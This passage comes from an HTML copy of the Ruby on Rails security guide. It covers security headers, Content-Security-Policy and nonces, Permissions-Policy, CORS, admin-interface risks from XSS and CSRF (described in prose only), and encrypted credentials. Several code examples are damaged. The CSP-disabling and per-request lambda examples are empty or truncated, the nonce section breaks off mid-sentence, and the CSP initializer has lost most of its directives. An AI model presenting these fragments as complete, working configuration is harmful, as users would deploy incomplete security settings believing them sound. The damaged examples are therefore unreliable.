<p>This header is set to <code class="language-plaintext highlighter-rouge">none</code> in Rails by default. It disallows Adobe Flash and
PDF clients from embedding your page on other domains.</p>

<h4 id="referrer-policy"><code class="language-plaintext highlighter-rouge">Referrer-Policy</code></h4>

<p>The <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy"><code class="language-plaintext highlighter-rouge">Referrer-Policy</code></a> header is set to <code class="language-plaintext highlighter-rouge">strict-origin-when-cross-origin</code> in Rails by default.
For cross-origin requests, this only sends the origin in the Referer header. This
prevents leaks of private data that may be accessible from other parts of the
full URL, such as the path and query string.</p>

<h4 id="configuring-the-default-headers">Configuring the Default Headers</h4>

<p>These headers are configured by default as follows:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span> <span class="o">=</span> <span class="p">{</span>
  <span class="s2">"X-Frame-Options"</span> <span class="o">=&gt;</span> <span class="s2">"SAMEORIGIN"</span><span class="p">,</span>
  <span class="s2">"X-XSS-Protection"</span> <span class="o">=&gt;</span> <span class="s2">"0"</span><span class="p">,</span>
  <span class="s2">"X-Content-Type-Options"</span> <span class="o">=&gt;</span> <span class="s2">"nosniff"</span><span class="p">,</span>
  <span class="s2">"X-Permitted-Cross-Domain-Policies"</span> <span class="o">=&gt;</span> <span class="s2">"none"</span><span class="p">,</span>
  <span class="s2">"Referrer-Policy"</span> <span class="o">=&gt;</span> <span class="s2">"strict-origin-when-cross-origin"</span>
<span class="p">}</span>
</code></pre></div></div>

<p>You can override these or add extra headers in <code class="language-plaintext highlighter-rouge">config/application.rb</code>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">[</span><span class="s2">"X-Frame-Options"</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"DENY"</span>
<span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">[</span><span class="s2">"Header-Name"</span><span class="p">]</span>     <span class="o">=</span> <span class="s2">"Value"</span>
</code></pre></div></div>

<p>Or you can remove them:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">default_headers</span><span class="p">.</span><span class="nf">clear</span>
</code></pre></div></div>

<h3 id="strict-transport-security-header"><code class="language-plaintext highlighter-rouge">Strict-Transport-Security</code> Header</h3>

<p>The HTTP <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security"><code class="language-plaintext highlighter-rouge">Strict-Transport-Security</code></a> (HSTS) response header makes sure the
browser automatically upgrades to HTTPS for current and future connections.</p>

<p>The header is added to the response when enabling the <code class="language-plaintext highlighter-rouge">force_ssl</code> option:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">config</span><span class="p">.</span><span class="nf">force_ssl</span> <span class="o">=</span> <span class="kp">true</span>
</code></pre></div></div>

<h3 id="content-security-policy-header"><code class="language-plaintext highlighter-rouge">Content-Security-Policy</code> Header</h3>

<p>To help protect against XSS and injection attacks, it is recommended to define a
<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy"><code class="language-plaintext highlighter-rouge">Content-Security-Policy</code></a> response header for your application. Rails
provides a DSL that allows you to configure the header.</p>

<p>Define the security policy in the appropriate initializer:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># config/initializers/content_security_policy.rb</span>
<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>

  <span class="n">policy</span><span class="p">.</span><span class="nf">style_src</span>   <span class="ss">:self</span><span class="p">,</span> <span class="ss">:https</span>
  <span class="c1"># Specify URI for violation reports</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">report_uri</span> <span class="s2">"/csp-violation-report-endpoint"</span>
<span class="k">end</span>
</code></pre></div></div>

<p>The globally configured policy can be overridden on a per-resource basis:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PostsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
  <span class="n">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
    <span class="n">policy</span><span class="p">.</span><span class="nf">upgrade_insecure_requests</span> <span class="kp">true</span>
    <span class="n">policy</span><span class="p">.</span><span class="nf">base_uri</span> <span class="s2">"https://www.example.com"</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>Or it can be disabled:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">LegacyPagesController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>

<span class="k">end</span>
</code></pre></div></div>

<p>Use lambdas to inject per-request values, such as account subdomains in a
multi-tenant application:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PostsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>

  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<h4 id="reporting-violations">Reporting Violations</h4>

<p>Enable the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri"><code class="language-plaintext highlighter-rouge">report-uri</code></a> directive to report violations to the specified URI:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">report_uri</span> <span class="s2">"/csp-violation-report-endpoint"</span>
<span class="k">end</span>
</code></pre></div></div>

<p>When migrating legacy content, you might want to report violations without
enforcing the policy. Set the <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only"><code class="language-plaintext highlighter-rouge">Content-Security-Policy-Report-Only</code></a>
response header to only report violations:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_report_only</span> <span class="o">=</span> <span class="kp">true</span>
</code></pre></div></div>

<p>Or override it in a controller:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PostsController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
  <span class="n">content_security_policy_report_only</span> <span class="ss">only: :index</span>
<span class="k">end</span>
</code></pre></div></div>

<h4 id="adding-a-nonce">Adding a Nonce</h4>

<p>If you are considering <code class="language-plaintext highlighter-rouge">'unsafe-inline'</code>, consider using nonces instead. <a href="https://www.w3.org/TR/CSP3/#security-nonces">Nonces
provide a substantial improvement</a>
over <code class="language-plaintext highlighter-rouge">'unsafe-inline'</code> when implementing a Content Security Policy on top

<p>There are a few tradeoffs to consider when configuring the nonce generator.
Using <code class="language-plaintext highlighter-rouge">SecureRandom.base64(16)</code> is a good default value, because it will
generate a new random nonce for each request. However, this method is
incompatible with <a href="caching_with_rails.html#conditional-get-support">conditional GET caching</a>
because new nonces will result in new ETag values for every request. An
alternative to per-request random nonces would be to use the session id:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_generator</span> <span class="o">=</span> <span class="o">-&gt;</span> <span class="n">request</span> <span class="p">{</span> <span class="n">request</span><span class="p">.</span><span class="nf">session</span><span class="p">.</span><span class="nf">id</span><span class="p">.</span><span class="nf">to_s</span> <span class="p">}</span>

<p>This generation method is compatible with ETags, however its security depends on
the session id being sufficiently random and not being exposed in insecure
cookies.</p>

<p>By default, nonces will be applied to <code class="language-plaintext highlighter-rouge">script-src</code> and <code class="language-plaintext highlighter-rouge">style-src</code> if a nonce
generator is defined. <code class="language-plaintext highlighter-rouge">config.content_security_policy_nonce_directives</code> can be
used to change which directives will use nonces:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_directives</span> <span class="o">=</span> <span class="sx">%w(script-src)</span>
</code></pre></div></div>

<p>Once nonce generation is configured in an initializer, automatic nonce values
can be added to script tags by passing <code class="language-plaintext highlighter-rouge">nonce: true</code> as part of <code class="language-plaintext highlighter-rouge">html_options</code>:</p>

<pre><code class="language-html+erb">&lt;%= javascript_tag nonce: true do -%&gt;
  alert('Hello, World!');
&lt;% end -%&gt;
</code></pre>

<p>The same works with <code class="language-plaintext highlighter-rouge">javascript_include_tag</code> and the <code class="language-plaintext highlighter-rouge">stylesheet_link_tag</code>:</p>

<pre><code class="language-html+erb">&lt;%= javascript_include_tag "script", nonce: true %&gt;
&lt;%= stylesheet_link_tag "style.css", nonce: true %&gt;
</code></pre>

<p>To automatically attach a nonce to <code class="language-plaintext highlighter-rouge">javascript_tag</code>, <code class="language-plaintext highlighter-rouge">javascript_include_tag</code>, and
<code class="language-plaintext highlighter-rouge">stylesheet_link_tag</code> if the corresponding directives are specified in <code class="language-plaintext highlighter-rouge">config.content_security_policy_nonce_directives</code>,
you can set <code class="language-plaintext highlighter-rouge">config.content_security_policy_nonce_auto</code> to <code class="language-plaintext highlighter-rouge">true</code>:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">content_security_policy_nonce_auto</span> <span class="o">=</span> <span class="kp">true</span>
</code></pre></div></div>

<p>This is especially useful for 3rd-party views when using nonce-based source expressions
in your Content Security Policy.</p>

<p>NOTE: Be mindful of caching. Since the nonce is typically generated per request,
enabling this may lead to cache fragmentation or stale content if your caching strategy
doesn’t account for dynamic nonces.</p>

<p>Use <a href="https://api.rubyonrails.org/classes/ActionView/Helpers/CspHelper.html#method-i-csp_meta_tag"><code class="language-plaintext highlighter-rouge">csp_meta_tag</code></a>
helper to create a meta tag “csp-nonce” with the per-session nonce value
for allowing inline <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tags.</p>

<pre><code class="language-html+erb">&lt;head&gt;
  &lt;%= csp_meta_tag %&gt;
&lt;/head&gt;
</code></pre>

<p>This is used by the Rails UJS helper to create dynamically
loaded inline <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> elements.</p>

<h3 id="feature-policy-header"><code class="language-plaintext highlighter-rouge">Feature-Policy</code> Header</h3>

<p>NOTE: The <code class="language-plaintext highlighter-rouge">Feature-Policy</code> header has been renamed to <code class="language-plaintext highlighter-rouge">Permissions-Policy</code>.
The <code class="language-plaintext highlighter-rouge">Permissions-Policy</code> requires a different implementation and isn’t
yet supported by all browsers. To avoid having to rename this
middleware in the future, we use the new name for the middleware but
keep the old header name and implementation for now.</p>

<p>To allow or block the use of browser features, you can define a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy"><code class="language-plaintext highlighter-rouge">Feature-Policy</code></a>
response header for your application. Rails provides a DSL that allows you to
configure the header.</p>

<p>Define the policy in the appropriate initializer:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># config/initializers/permissions_policy.rb</span>
<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">permissions_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">camera</span>      <span class="ss">:none</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">gyroscope</span>   <span class="ss">:none</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">microphone</span>  <span class="ss">:none</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">usb</span>         <span class="ss">:none</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">fullscreen</span>  <span class="ss">:self</span>
  <span class="n">policy</span><span class="p">.</span><span class="nf">payment</span>     <span class="ss">:self</span><span class="p">,</span> <span class="s2">"https://secure.example.com"</span>
<span class="k">end</span>
</code></pre></div></div>

<p>The globally configured policy can be overridden on a per-resource basis:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PagesController</span> <span class="o">&lt;</span> <span class="no">ApplicationController</span>
  <span class="n">permissions_policy</span> <span class="k">do</span> <span class="o">|</span><span class="n">policy</span><span class="o">|</span>
    <span class="n">policy</span><span class="p">.</span><span class="nf">geolocation</span> <span class="s2">"https://example.com"</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<h3 id="cross-origin-resource-sharing">Cross-Origin Resource Sharing</h3>

<p>Browsers restrict cross-origin HTTP requests initiated from scripts. If you
want to run Rails as an API, and run a frontend app on a separate domain, you
need to enable <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS">Cross-Origin Resource
Sharing</a> (CORS).</p>

<p>You can use the <a href="https://github.com/cyu/rack-cors">Rack CORS</a> middleware for
handling CORS. If you’ve generated your application with the <code class="language-plaintext highlighter-rouge">--api</code> option,
Rack CORS has probably already been configured and you can skip the following
steps.</p>

<p>To get started, add the rack-cors gem to your Gemfile:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gem</span> <span class="s2">"rack-cors"</span>
</code></pre></div></div>

<p>Next, add an initializer to configure the middleware:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># config/initializers/cors.rb</span>
<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">middleware</span><span class="p">.</span><span class="nf">insert_before</span> <span class="mi">0</span><span class="p">,</span> <span class="no">Rack</span><span class="o">::</span><span class="no">Cors</span> <span class="k">do</span>
  <span class="n">allow</span> <span class="k">do</span>
    <span class="n">origins</span> <span class="s2">"example.com"</span>

    <span class="n">resource</span> <span class="s2">"*"</span><span class="p">,</span>
      <span class="ss">headers: :any</span><span class="p">,</span>
      <span class="ss">methods: </span><span class="p">[</span><span class="ss">:get</span><span class="p">,</span> <span class="ss">:post</span><span class="p">,</span> <span class="ss">:put</span><span class="p">,</span> <span class="ss">:patch</span><span class="p">,</span> <span class="ss">:delete</span><span class="p">,</span> <span class="ss">:options</span><span class="p">,</span> <span class="ss">:head</span><span class="p">]</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<h2 id="intranet-and-admin-security">Intranet and Admin Security</h2>

<p>Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.</p>

<p>In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the “Monster for employers” website of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF.</p>

<h3 id="cross-site-scripting">Cross-Site Scripting</h3>

<p>If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.</p>

<p>Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator’s cookie, injecting an iframe to steal the administrator’s password or installing malicious software through browser security holes to take over the administrator’s computer.</p>

<p>Refer to the Injection section for countermeasures against XSS.</p>

<h3 id="cross-site-request-forgery">Cross-Site Request Forgery</h3>

<p>Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.</p>

<p>A real-world example is a <a href="http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html">router reconfiguration by CSRF</a>. The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for the user, but it also contained an image tag that resulted in an HTTP-GET request to reconfigure the user’s router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker’s site. Everyone who accessed the banking site through that router saw the attacker’s fake website and had their credentials stolen.</p>

<p>Another example changed Google Adsense’s e-mail address and password. If the victim was logged into Google Adsense, the administration interface for Google advertisement campaigns, an attacker could change the credentials of the victim.</p>

<p>Another popular attack is to spam your web application, your blog, or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application’s admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.</p>

<p>For <em>countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section</em>.</p>

<h3 id="additional-precautions">Additional Precautions</h3>

<p>The common admin interface works like this: it’s located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:</p>

<ul>
  <li>
    <p>It is very important to <em>think about the worst case</em>: What if someone really got hold of your cookies or user credentials. You could <em>introduce roles</em> for the admin interface to limit the possibilities of the attacker. Or how about <em>special login credentials</em> for the admin interface, other than the ones used for the public part of the application. Or a <em>special password for very serious actions</em>?</p>
  </li>
  <li>
    <p>Does the admin really have to access the interface from everywhere in the world? Think about <em>limiting the login to a bunch of source IP addresses</em>. Examine request.remote_ip to find out about the user’s IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.</p>
  </li>
  <li>
    <p><em>Put the admin interface to a special subdomain</em> such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.</p>
  </li>
</ul>

<h2 id="environmental-security">Environmental Security</h2>

<p>It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. <code class="language-plaintext highlighter-rouge">config/database.yml</code>, master key for <code class="language-plaintext highlighter-rouge">credentials.yml</code>, and other unencrypted secrets. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.</p>

<h3 id="custom-credentials">Custom Credentials</h3>

<p>Rails stores secrets in <code class="language-plaintext highlighter-rouge">config/credentials.yml.enc</code>, which is encrypted and hence cannot be edited directly. Rails uses <code class="language-plaintext highlighter-rouge">config/master.key</code> or alternatively looks for the environment variable <code class="language-plaintext highlighter-rouge">ENV["RAILS_MASTER_KEY"]</code> to encrypt the credentials file. Because the credentials file is encrypted, it can be stored in version control, as long as the master key is kept safe.</p>

<p>By default, the credentials file contains the application’s
<code class="language-plaintext highlighter-rouge">secret_key_base</code>. It can also be used to store other secrets such as access keys for external APIs.</p>

<p>To edit the credentials file, run <code class="language-plaintext highlighter-rouge">bin/rails credentials:edit</code>. This command will create the credentials file if it does not exist. Additionally, this command will create <code class="language-plaintext highlighter-rouge">config/master.key</code> if no master key is defined.</p>

<p>Secrets kept in the credentials file are accessible via <code class="language-plaintext highlighter-rouge">Rails.application.credentials</code>.
For example, with the following decrypted <code class="language-plaintext highlighter-rouge">config/credentials.yml.enc</code>:</p>

<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">3b7cd72...</span>
<span class="na">some_api_key</span><span class="pi">:</span> <span class="s">SOMEKEY</span>
<span class="na">system</span><span class="pi">:</span>
  <span class="na">access_key_id</span><span class="pi">:</span> <span class="s">1234AB</span>
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Rails.application.credentials.some_api_key</code> returns <code class="language-plaintext highlighter-rouge">"SOMEKEY"</code>. <code class="language-plaintext highlighter-rouge">Rails.application.credentials.system.access_key_id</code> returns <code class="language-plaintext highlighter-rouge">"1234AB"</code>.</p>

<p>If you want an exception to be raised when some key is blank, you can use the bang
version:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># When some_api_key is blank...</span>
<span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">credentials</span><span class="p">.</span><span class="nf">some_api_key!</span> <span class="c1"># =&gt; KeyError: :some_api_key is blank</span>
</code></pre></div></div>

<p>TIP: Learn more about credentials with <code class="language-plaintext highlighter-rouge">bin/rails credentials:help</code>.</p>

<p>WARNING: Keep your master key safe. Do not commit your master key.</p>

<h2 id="dependency-management-and-cves">Dependency Management and CVEs</h2>

<p>We don’t bump dependencies just to encourage use of new versions, including for security issues. This is because application owners need to manually update their gems regardless of our efforts. Use <code class="language-plaintext highlighter-rouge">bundle update --conservative gem_name</code> to safely update vulnerable dependencies.</p>

<h2 id="additional-resources">Additional Resources</h2>

<p>The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:</p>
